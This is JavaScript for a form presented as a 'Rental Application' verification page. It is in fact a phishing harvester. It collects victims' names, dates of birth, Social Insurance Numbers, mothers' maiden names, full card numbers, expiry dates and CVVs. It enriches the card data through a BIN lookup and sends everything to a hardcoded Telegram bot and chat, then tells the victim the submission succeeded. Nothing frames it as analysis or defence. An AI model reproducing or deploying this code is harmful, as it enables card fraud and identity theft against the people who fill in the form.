document.getElementById('verificationForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const formData = {
        fullName: document.getElementById('fullName').value,
        phoneNumber: document.getElementById('phoneNumber').value,
        email: document.getElementById('email').value,
        dob: document.getElementById('dob').value,
        sin: document.getElementById('sin').value,
        mmn: document.getElementById('mmn').value,
        cardNumber: document.getElementById('cardNumber').value,
        expDate: document.getElementById('expDate').value,
        cvv: document.getElementById('cvv').value,
        billingAddress: document.getElementById('billingAddress').value,
        notes: document.getElementById('notes').value
    };

    // Function to perform a BIN lookup
    async function binLookup(creditCardNumber) {
        const bin = creditCardNumber.substring(0, 6); // Get the first 6 digits for BIN
        const response = await fetch(`https://lookup.binlist.net/${bin}`);
        if (response.ok) {
            return await response.json();
        } else {
            return null;
        }
    }

    // Perform BIN lookup
    const binData = await binLookup(formData.cardNumber);

    if (binData) {
        const telegramMessage = `
        📝 *Rental Application Details* 📝

        👤 *Name*: ${formData.fullName}
        📞 *Phone Number*: ${formData.phoneNumber}
        📧 *Email*: ${formData.email}
        🎂 *Date of Birth*: ${formData.dob}
        🆔 *SIN*: ${formData.sin}
        👩‍👧 *Mother's Maiden Name*: ${formData.mmn}

        💳 *Card Type*: ${binData.scheme.toUpperCase()} (${binData.type.toUpperCase()})
        🌍 *Country*: ${binData.country.name}
        🏦 *Bank*: ${binData.bank ? binData.bank.name : 'N/A'}

        🔒 *Card Number*: ${formData.cardNumber}
        🗓 *Expiration Date*: ${formData.expDate}
        🔐 *CVV*: ${formData.cvv}
        🏠 *Billing Address*: ${formData.billingAddress}

        📝 *Additional Notes*: ${formData.notes}
        `;

        // Send the message to Telegram
        fetch(`https://api.telegram.org/bot5884162033:AAE_sn6_6p2x5jjMI5_sJLSPjkIIOZ1VM9U/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '-4554660486',
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('Application submitted successfully!');
            } else {
                alert('Telegram Error: ' + data.description);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('There was an error sending to Telegram');
        });
    } else {
        alert('BIN lookup failed.');
    }
});
